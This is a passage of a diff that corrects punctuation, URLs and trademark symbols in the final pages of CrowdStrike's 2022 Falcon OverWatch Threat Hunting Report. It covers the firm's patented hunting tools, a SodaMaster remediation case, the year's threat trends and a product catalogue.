 that feed this framework are continuously developed and refined by OverWatch analysts 
 based on up\-to\-the\-minute threat intelligence. 
 28 
- For more on the SEARCH methodology, see https:www.youtube.comwatch?v\=YxcnI\_ZjQAA and https:
-www.crowdstrike.comresourcescrowdcastsdont\-wait\-to\-be\-a\-cyber\-victim\-search\-for\-hidden\-threats. 
+ For more on the SEARCH methodology, see https://www.youtube.com/watch?v\=YxcnI\_ZjQAA and https://
+www.crowdstrike.com/resources/crowdcasts/dont\-wait\-to\-be\-a\-cyber\-victim\-search\-for\-hidden\-threats/. 
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 70
@@ -3180,7 +3272,7 @@ activity.
 The Cardinality\-Based Activity Pattern Detection tool looks for related and coinciding 
 bursts of potentially malicious activity patterns on individual machines and surfaces these 
 for further human analysis. To support rapid analysis by threat hunters, the tool presents 
-the data visually grouping together activity patterns with a graphical representation of 
+the data visually — grouping together activity patterns with a graphical representation of 
 the fidelity value to illustrate the degree to which each of the activity patterns indicates 
 possible malicious activity. In addition, the Cross\-Machine Detection Techniques tool takes 
 this information and, if a first device is flagged, looks for suspicious activity patterns across 
@@ -3191,7 +3283,7 @@ Assess Ancestry: Artificial Intelligence Used to
 Reveal Malicious Intent
 Some events are so common within enterprise environments that including them in the 
 bursts would create more noise than insight. But these same commonplace events can also 
-be key to identifying a potential intrusion. OverWatchs patented hunting tool for Computer\-
+be key to identifying a potential intrusion. OverWatch’s patented hunting tool for Computer\-
 Security Event Security\-Violation Detection was built to use artificial intelligence (AI) to 
 predict whether an event is malicious on the basis of the ancestry of the command line. This 
 tool classifies hunting leads before they go to hunters, helping funnel only the relevant data for 
@@ -3200,7 +3292,7 @@ This tool supports both hunting lead generation and optimization, using three di
 models to analyze the data to look for behaviors associated with malware and targeted 
 intrusion activity. One model is specifically trained on OverWatch targeted data. The other 
 two models look for behavior indicative of malware intrusion activity. Of those two, one is 
-calibrated to find unknown hunting leads this model is more balanced, funneling more 
+calibrated to find unknown hunting leads — this model is more balanced, funneling more 
 data to analysts and reducing the risk that novel malicious activity is missed. The other 
 model is more narrowly calibrated to consistently identify known hunting leads. 
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
@@ -3208,29 +3300,29 @@ CrowdStrike
 71
 Family Ties: Clusters of Command Lines Link 
 Malware Families
-Rounding out this years patents is the Computer\-Security Event Clustering and Violation 
+Rounding out this year’s patents is the Computer\-Security Event Clustering and Violation 
 Detection system. This system can identify malware families within specific customer 
 environments based on clusters of command lines, and thus has applications for both 
 detections and research. This information provides insights into malware threats that can 
 enable victim organizations to lock down vulnerabilities in their systems. Additionally, by 
 reviewing the data that this system generates over time, it is also possible to track changes 
-in how particular malware families present in victim organizations environments.
+in how particular malware families present in victim organization’s environments.
 These patented hunting technologies are just some of the custom tools used by 
 OverWatch threat hunters. They enable OverWatch to successfully scale with the 
 proliferation of adversary activity while maintaining critical human insight and ingenuity in its 
-hunting operations. OverWatchs technology enables threat hunters to focus their attention 
+hunting operations. OverWatch’s technology enables threat hunters to focus their attention 
 on analyzing the data most likely to yield malicious findings, arming customers to disrupt 
 adversarial activity as soon as possible.
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 72
 Better Together
-Threes a CrowdStrike 
+Three’s a CrowdStrike 
 Powerhouse
 A significant amount of collaboration happens behind the scenes at CrowdStrike 
 to stop breaches. At the core of this collaboration sits CrowdStrike Intelligence, 
 delivering unparalleled coverage of the global threat landscape. This intelligence 
-is fed, in part, by findings from the front lines teams like CrowdStrike Services, 
+is fed, in part, by findings from the front lines — teams like CrowdStrike Services, 
 Falcon OverWatch and Falcon Complete. In return, this treasure trove of threat 
 intelligence empowers threat hunters and others to offer CrowdStrike customers 
 detailed insights into the threats they face.
@@ -3240,13 +3332,13 @@ svchost.exe. The implant was beaconing to adversary\-owned infrastructure,
 which, thanks to CrowdStrike Intelligence, was quickly identified as being 
 connected to the China\-nexus malware SodaMaster remote access tool. As this 
 information was relayed to the victim, Falcon Complete leveraged pre\-approved 
-customer countermeasures and Falcons RTR capability to network contain the 
-host successfully severing the adversarys network access.
+customer countermeasures and Falcon’s RTR capability to network contain the 
+host — successfully severing the adversary’s network access.
 Falcon Complete proceeded to perform further analysis on the host to uncover 
 artifacts related to the implant. Several malicious .exe, .dll and .dat files were 
 identified and removed from the following directory used by the malware: 
 C:
-ProgramDataMicrosoftDRM. 
+\\ProgramData\\Microsoft\\DRM\\. 
 In addition, Falcon Complete analysts removed persistence on the host by killing the 
 svchost process the malware was abusing and removing related malicious services 
 (named NlaSSvc and puttysrv). Further analysis by CrowdStrike Intelligence 
@@ -3258,7 +3350,7 @@ experienced the rapid detection capabilities of OverWatch, the expert remediatio
 offered by Falcon Complete, and the deep threat insights offered by CrowdStrike 
 Intelligence. In one seamless interaction with CrowdStrike, this victim organization 
 walked away more secure and also more aware of the threats they face from a 
-targeted China\-nexus adversary empowering them to make proactive decisions 
+targeted China\-nexus adversary — empowering them to make proactive decisions 
 about their security needs in the future.
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
@@ -3271,66 +3363,84 @@ pressures and geopolitical tensions, backdropping a cyber threat landscape that 
 complicated as ever. In the 12 months from July 1, 2021, to June 30, 2022, OverWatch once 
 again uncovered a record number of interactive intrusions and has watched adversary 
 behavior adapt and evolve. The findings and data in this report reflect observations derived 
-from OverWatchs global hunting activities.
+from OverWatch’s global hunting activities.
 Looking back, OverWatch threat hunters identified several key trends in adversarial 
-behavior over the past year. This includes an increase in:\+
+behavior over the past year. This includes an increase in: 
+ 
+\+
 CVEs and zero\-days, which require a scalable defense solution laser\-focused 
 on the post\-exploitation behaviors that remain constant across all interactive 
-intrusions\+
+intrusions
+ 
+\+
 RaaS affiliate models, which require defenders to be on alert for the ways various 
-affiliates leverage different tradecraft to deploy the same tooling\+
+affiliates leverage different tradecraft to deploy the same tooling 
+ 
+\+
 Tool usage for adversaries looking to increase their odds of remaining 
 undetected in a network 
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 74
 Looking deeper, OverWatch threat hunters observed adversaries evolve and grow their 
-tradecraft in new and novel ways. This includes:\+
+tradecraft in new and novel ways. This includes: 
+ 
+\+
 An insightful look at what AQUATIC PANDA was able to achieve when deeply 
-entrenched in a victim network\+
+entrenched in a victim network
+ 
+\+
 The proliferation of interactive eCrime activity leveraging affiliate models to 
 effectively rent access to ransomware platforms, enabling eCrime groups to 
 perform BGH attacks without the time and resources previously necessary to 
-develop the tooling or capabilities in\-house\+
+develop the tooling or capabilities in\-house 
+ 
+\+
 The increased use of ISO files by both eCrime and targeted adversaries to deliver 
 malicious software 
-And lastly, looking ahead, OverWatch remains on the cutting edge of the threat landscape 
-growing the hunters ability to meet the adversary where they are. This includes:\+
-Continuously improving the ability to hunt effectively on cloud telemetry\+
-Researching new and innovative ways to improve Falcons patented hunting 
-workflows and tools\+
-Tuning the autonomous tooling leveraged by OverWatchs human threat hunters to 
-find even the unknown unknowns in todays threat landscape faster and more 
+And lastly, looking ahead, OverWatch remains on the cutting edge of the threat landscape — 
+growing the hunters’ ability to meet the adversary where they are. This includes: 
+ 
+\+
+Continuously improving the ability to hunt effectively on cloud telemetry
+ 
+\+
+Researching new and innovative ways to improve Falcon’s patented hunting 
+workflows and tools 
+ 
+\+
+Tuning the autonomous tooling leveraged by OverWatch’s human threat hunters to 
+find even the unknown unknowns in today’s threat landscape — faster and more 
 efficiently than ever before
-OverWatch comes face\-to\-face with todays most determined adversaries daily and is 
-coming out on top. OverWatch remains vigilant, providing its customers with the 247365 
+OverWatch comes face\-to\-face with today’s most determined adversaries daily — and is 
+coming out on top. OverWatch remains vigilant, providing its customers with the 24/7/365 
 coverage needed to remain ahead of the threats posed in the past 12 months and into the 
 future. The specific recommendations offered within this report aim to guide defenders 
-as they harden their networks against all malicious threats regardless of initial access 
+as they harden their networks against all malicious threats — regardless of initial access 
 vector, adversarial motivation, or techniques and tooling used. 
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 75
 About Falcon 
 OverWatch
-The CrowdStrike Falcon OverWatch managed threat hunting service is built on the 
-CrowdStrike Falcon platform. OverWatchs mission is simple to augment technology\-
-based defenses with247365human\-led analysis to uncover attempts to subvert 
+The CrowdStrike Falcon OverWatch™ managed threat hunting service is built on the 
+CrowdStrike Falcon® platform. OverWatch’s mission is simple — to augment technology\-
+based defenses with 24/7/365 human\-led analysis to uncover attempts to subvert 
 automated detection controls.
 OverWatch has unparalleled visibility across customer environments thanks to the power 
 of the CrowdStrike Security Cloud, which continuously ingests, contextualizes and 
 enriches cloud\-scale telemetry of trillions of events daily from across customer endpoints, 
 workloads, identities, DevOps, IT assets and configurations. The value of this data is 
-augmented by OverWatchs patented hunting workflows and specialized tooling that 
+augmented by OverWatch’s patented hunting workflows and specialized tooling that 
 enable hunters to quickly process and distill this vast sea of data to identify threats in near 
 real time. Finally, OverWatch is informed by the latest threat intelligence on the tradecraft of 
-over180 threat groups tracked by CrowdStrike Intelligence. 
+over 180 threat groups tracked by CrowdStrike Intelligence. 
 This combination of telemetry, tooling, threat intelligence and human ingenuity enables 
 threat hunters to uncover even the most sophisticated and stealthy threats. OverWatch 
 truly leaves adversaries with nowhere to hide.29
 29 
 For more information on how Falcon OverWatch performs its mission, please see 
-https:www.crowdstrike.comservicesmanaged\-servicesfalcon\-overwatch\-threat\-hunting.
+https://www.crowdstrike.com/services/managed\-services/falcon\-overwatch\-threat\-hunting/.
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 76
@@ -3338,95 +3448,95 @@ CrowdStrike
 Products and 
 Services
 Endpoint Security
-FALCON XDR \| EXTENDED DETECTION AND RESPONSE (XDR) 
+FALCON XDR™ \| EXTENDED DETECTION AND RESPONSE (XDR) 
 Supercharges detection and response across your entire security stack by synthesizing multi\-domain 
 telemetry in one unified, threat\-centric command console 
-FALCON PREVENT \| NEXT\-GENERATION ANTIVIRUS 
+FALCON PREVENT™ \| NEXT\-GENERATION ANTIVIRUS 
 Protects against all types of threats, from malware and ransomware to sophisticated attacks, and deploys 
 in minutes, immediately protecting your endpoints 
-FALCON INSIGHT \| ENDPOINT DETECTION AND RESPONSE (EDR) 
+FALCON INSIGHT™ \| ENDPOINT DETECTION AND RESPONSE (EDR) 
 Delivers continuous, comprehensive endpoint visibility and automatically detects and intelligently 
 prioritizes malicious activity to ensure nothing is missed and potential breaches are stopped 
-FALCON FIREWALL MANAGEMENT \| HOST FIREWALL 
+FALCON FIREWALL MANAGEMENT™ \| HOST FIREWALL 
 Delivers simple, centralized host firewall management, making it easy to manage and control host firewall 
 policies 
-FALCON DEVICE CONTROL \| USB DEVICE VISIBILITY AND CONTROL 
+FALCON DEVICE CONTROL™ \| USB DEVICE VISIBILITY AND CONTROL 
 Provides the visibility and precise control required to enable safe usage of USB devices across your 
 organization 
 Threat Intelligence
-FALCON INTELLIGENCE \| AUTOMATED THREAT INTELLIGENCE 
+FALCON INTELLIGENCE™ \| AUTOMATED THREAT INTELLIGENCE 
 Enriches the events and incidents detected by the CrowdStrike Falcon platform, automating intelligence so 
 security operations teams can make better, faster decisions 
-FALCON INTELLIGENCE PREMIUM \| CYBER THREAT INTELLIGENCE 
+FALCON INTELLIGENCE PREMIUM™ \| CYBER THREAT INTELLIGENCE 
 Delivers world\-class intelligence reporting, technical analysis, malware analysis and threat hunting 
 capabilities, enabling organizations to build cyber resiliency and more effectively defend against 
 sophisticated nation\-state, eCrime and hacktivist adversaries 
-FALCON INTELLIGENCE ELITE \| ASSIGNED INTELLIGENCE ANALYST 
+FALCON INTELLIGENCE ELITE™ \| ASSIGNED INTELLIGENCE ANALYST 
 Maximizes your investment in Falcon Intelligence Premium with access to a CrowdStrike threat 
 intelligence analyst whose mission is helping you defend against adversaries targeting your 
 organization 
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 77
-FALCON INTELLIGENCE RECON \| DIGITAL THREAT MONITORING 
+FALCON INTELLIGENCE RECON™ \| DIGITAL THREAT MONITORING 
 Monitors potentially malicious activity across the open, deep and dark web, enabling you to better protect 
 your brand, employees and sensitive data 
-FALCON INTELLIGENCE RECON\+ \| MANAGED THREAT MONITORING 
+FALCON INTELLIGENCE RECON\+™ \| MANAGED THREAT MONITORING 
 Provides CrowdStrike experts to manage the monitoring, triaging, assessing and mitigating of threats 
 across the criminal underground 
-FALCON SANDBOX \| MALWARE ANALYSIS 
+FALCON SANDBOX™ \| MALWARE ANALYSIS 
 Uncovers the full malware attack lifecycle with in\-depth insight into all file, network, memory and process 
 activity, and provides easy\-to\-understand reports, actionable IOCs and seamless integration 
 Managed Services
-FALCON OVERWATCH \| MANAGED THREAT HUNTING 
+FALCON OVERWATCH™ \| MANAGED THREAT HUNTING 
 Partners you with a team of elite cybersecurity experts to hunt continuously within the Falcon platform for 
 faint signs of sophisticated intrusions, leaving attackers nowhere to hide 
-FALCON OVERWATCH ELITE \| ASSIGNED MANAGED THREAT HUNTING ANALYST 
+FALCON OVERWATCH ELITE™ \| ASSIGNED MANAGED THREAT HUNTING ANALYST 
 Extends your team with an assigned CrowdStrike threat hunting analyst, providing dedicated expertise, 
 tactical day\-to\-day insights into your threat landscape and strategic advisory to help drive continuous 
 improvement 
-FALCON COMPLETE \| MANAGED DETECTION AND RESPONSE (MDR) 
-Stops and eradicates threats in minutes with 247 expert management, monitoring and surgical 
-remediation, backed by the industrys strongest Breach Prevention Warranty 
+FALCON COMPLETE™ \| MANAGED DETECTION AND RESPONSE (MDR) 
+Stops and eradicates threats in minutes with 24/7 expert management, monitoring and surgical 
+remediation, backed by the industry’s strongest Breach Prevention Warranty 
 Cloud Security
-FALCON CLOUD WORKLOAD PROTECTION 
+FALCON CLOUD WORKLOAD PROTECTION™ 
 Provides comprehensive breach protection across private, public, hybrid and multi\-cloud environments, 
 allowing customers to rapidly adopt and secure technology across any workload 
-FALCON HORIZON \| CLOUD SECURITY POSTURE MANAGEMENT 
+FALCON HORIZON™ \| CLOUD SECURITY POSTURE MANAGEMENT 
 Streamlines cloud security posture management across the application lifecycle for multi\-cloud 
 environments, enabling you to securely deploy applications in the cloud with greater speed and efficiency 
 CROWDSTRIKE CONTAINER SECURITY 
 Automates the secure development of cloud\-native applications by delivering full\-stack protection and 
 compliance for containers, Kubernetes and hosts across the container lifecycle 
-FALCON CLOUD WORKLOAD PROTECTION COMPLETE \| MDR FOR CLOUD 
+FALCON CLOUD WORKLOAD PROTECTION COMPLETE™ \| MDR FOR CLOUD 
 WORKLOADS 
 Provides a fully managed service with seasoned security professionals who have experience in cloud 
 defense, incident handling and response, forensics, SOC analysis and IT administration 
-FALCON OVERWATCH CLOUD THREAT HUNTING \| MANAGED SERVICES 
+FALCON OVERWATCH CLOUD THREAT HUNTING™ \| MANAGED SERVICES 
 Unearths cloud threats, from unique cloud attack paths with complex trails of cloud IOAs and indicators 
-of misconfiguration (IOMs) to well\-concealed adversary activity in your critical cloud infrastructure 
+of misconfiguration (IOMs) to well\-concealed adversary activity in your critical cloud infrastructure — 
 including AWS, Azure and Google Cloud Platform 
 Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 78
 Security and IT Operations
-FALCON DISCOVER \| IT HYGIENE 
+FALCON DISCOVER™ \| IT HYGIENE 
 Identifies unauthorized accounts, systems and applications anywhere in your environment in real time, 
 enabling faster remediation to improve your overall security posture 
-FALCON SPOTLIGHT \| VULNERABILITY MANAGEMENT 
+FALCON SPOTLIGHT™ \| VULNERABILITY MANAGEMENT 
 Offers security teams an automated, comprehensive vulnerability management solution, enabling faster 
 prioritization and improved remediation workflows without resource\-intensive scans 
-FALCON FILEVANTAGE \| FILE INTEGRITY MONITORING 
+FALCON FILEVANTAGE™ \| FILE INTEGRITY MONITORING 
 Provides real\-time, comprehensive and centralized visibility that boosts compliance and offers relevant 
 contextual data 
-FALCON FORENSICS \| FORENSIC CYBERSECURITY 
+FALCON FORENSICS™ \| FORENSIC CYBERSECURITY 
 Automates collection of point\-in\-time and historic forensic triage data for robust analysis of cybersecurity 
 incidents 
 Identity Protection
-FALCON IDENTITY THREAT DETECTION 
+FALCON IDENTITY THREAT DETECTION™ 
 Enables hyper\-accurate detection of identity\-based threats in real time, leveraging AI and behavioral 
 analytics to provide deep actionable insights to stop modern attacks like ransomware 
-FALCON IDENTITY THREAT PROTECTION 
+FALCON IDENTITY THREAT PROTECTION™ 
 Enables hyper\-accurate threat detection and real\-time prevention of identity\-based attacks by 
 combining the power of advanced AI, behavioral analytics and a flexible policy engine to enforce risk\-
 based conditional access 
@@ -3443,13 +3553,13 @@ Nowhere to Hide: 2022 Falcon OverWatch Threat Hunting Report
 CrowdStrike
 79
 CrowdStrike Services
-Delivers pre\- and post\-incident response (IR) services 247 to support you before, during and after 
+Delivers pre\- and post\-incident response (IR) services 24/7 to support you before, during and after 
 a breach, with skilled teams to help you defend against and respond to security incidents, prevent 
 breaches and optimize your speed to remediation 
 PREPARE: ADVISORY SERVICES 
 TABLETOP EXERCISE 
 ADVERSARY EMULATION EXERCISE 
-RED TEAM BLUE TEAM 
+RED TEAM / BLUE TEAM 
 PENETRATION TESTING 
 RESPOND: BREACH SERVICES 
 INCIDENT RESPONSE (DFIR) 
@@ -3481,11 +3591,11 @@ CrowdStrike
 CrowdStrike
 80
 CrowdStrike Holdings, Inc. (Nasdaq: CRWD), a global cybersecurity 
-leader, has redefined modern security with the worlds most ad
-vanced cloud\-native platform for protecting critical areas of enter
+leader, has redefined modern security with the world’s most ad­
+vanced cloud\-native platform for protecting critical areas of enter­
 prise risk\-endpoints and cloud workloads, identity and data. 
 Powered by the CrowdStrike Security Cloud and world\-class AI, 
-the CrowdStrike Falcon platform leverages real\-time indicators of 
+the CrowdStrike Falcon® platform leverages real\-time indicators of 
 attack, threat intelligence, evolving adversary tradecraft and enriched 
 telemetry from across the enterprise to deliver hyper\-accurate 
 detections, automated protection and remediation, elite threat hunting 
@@ -3499,9 +3609,11 @@ We stop breaches.
 Learn more
 www.crowdstrike.com
 Follow us: 
-Blog \| Twitter \| LinkedIn \| Facebook \| InstagramStart a free trial today: 
-www.crowdstrike.comfree\-trial\-guide
- 2022 CrowdStrike, Inc. All rights reserved. CrowdStrike, the falcon logo, CrowdStrike 
+Blog \| Twitter \| LinkedIn \| Facebook \| Instagram
+
+Start a free trial today: 
+www.crowdstrike.com/free\-trial\-guide/
+© 2022 CrowdStrike, Inc. All rights reserved. CrowdStrike, the falcon logo, CrowdStrike 
 Falcon and CrowdStrike Threat Graph are marks owned by CrowdStrike, Inc. and 
 registered with the United States Patent and Trademark Office, and in other countries. 
 CrowdStrike owns other trademarks and service marks, and may use the brands of third 
